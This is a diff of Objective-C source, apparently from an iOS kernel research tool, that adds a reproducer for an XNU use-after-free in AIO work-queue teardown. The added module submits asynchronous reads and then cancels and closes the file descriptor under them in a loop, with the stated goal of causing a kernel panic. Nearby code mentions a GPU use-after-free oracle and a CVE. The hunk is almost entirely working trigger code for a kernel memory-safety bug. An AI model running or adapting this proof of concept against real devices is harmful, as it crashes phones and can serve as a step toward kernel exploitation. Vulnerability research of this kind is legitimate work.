@@ -197,8 +197,69 @@ NSString *ModIOGPUUAFOracle(void) {
 }
 
 // ===========================================================================
-// 2. CVE-2025-46285: vm_map timestamp wrap measurement
+// 3. Family B reproducer: the aio_workq_entry UAF (48 panics, pc+0x4cff40)
+//    The second panic family (48 of the 60 device panics, never analysed
+//    before) faults in lck_mtx_lock fast path on a lock at [obj+0x58] of a
+//    FREED object; the neighbourhood strings are kern_aio.c, lio_listio,
+//    kern_descrip.c and the XNU panic "aio_workq_entry %p being freed while
+//    still enqueued" - i.e. the AIO work-queue entry teardown.  This module
+//    drives exactly that shape: submit POSIX AIO reads, then tear the
+//    descriptors down under them (close + aio_cancel) so completions and
+//    teardown race, in a loop.  A panic is the reproduction.
 // ===========================================================================
+#import <aio.h>
+
+NSString *ModAioRace(void) {
+    AveLog(@"[aio] === family B reproducer: aio_workq_entry teardown race (48 panics) ===");
+    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
+                            NSUserDomainMask, YES) firstObject];
+    NSString *path = [docs stringByAppendingPathComponent:@"aio_race_file"];
+    const char *cpath = path.UTF8String;
+
+    int panics_expected = 0;
+    for (int round = 0; round < 24; round++) {
+        @autoreleasepool {
+            // a fresh file with real content every round
+            int wfd = open(cpath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+            if (wfd < 0) { AveLog(S(@"[aio] round %d: create failed %d", round, errno)); continue; }
+            char buf[4096];
+            memset(buf, 0x41, sizeof buf);
+            for (int i = 0; i < 8; i++) if (write(wfd, buf, sizeof buf) != (ssize_t)sizeof buf) break;
+            fsync(wfd);
+            lseek(wfd, 0, SEEK_SET);
+
+            // submit AIO reads on it
+            enum { N = 16 };
+            struct aiocb cb[N];
+            char *rbuf[N];
+            for (int i = 0; i < N; i++) {
+                rbuf[i] = malloc(2048);
+                memset(&cb[i], 0, sizeof cb[i]);
+                cb[i].aio_fildes = wfd;
+                cb[i].aio_buf = rbuf[i];
+                cb[i].aio_nbytes = 2048;
+                cb[i].aio_offset = (off_t)(i * 2048);
+                cb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+                if (aio_read(&cb[i]) != 0)
+                    AveLog(S(@"[aio] round %d: aio_read %d -> %d", round, i, errno));
+            }
+            // tear the descriptor down under the in-flight requests
+            aio_cancel(wfd);
+            close(wfd);
+            // let the completions/teardown run
+            usleep(30000);
+            for (int i = 0; i < N; i++) {
+                if (rbuf[i]) { volatile char c = rbuf[i][0]; (void)c; free(rbuf[i]); }
+            }
+            unlink(cpath);
+            panics_expected++;
+            if ((round & 7) == 7)
+                AveLog(S(@"[aio] %d rounds of AIO teardown churn done", round + 1));
+        }
+    }
+    AveSetStatus(@"aio race churn done");
+    return S(@"aio teardown churn: %d rounds (submit + close + cancel); a panic = family B reproduced", panics_expected);
+}
 static long long rs_vmwrap_read(void) {
     FILE *f = fopen([[[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                          NSUserDomainMask, YES) firstObject]
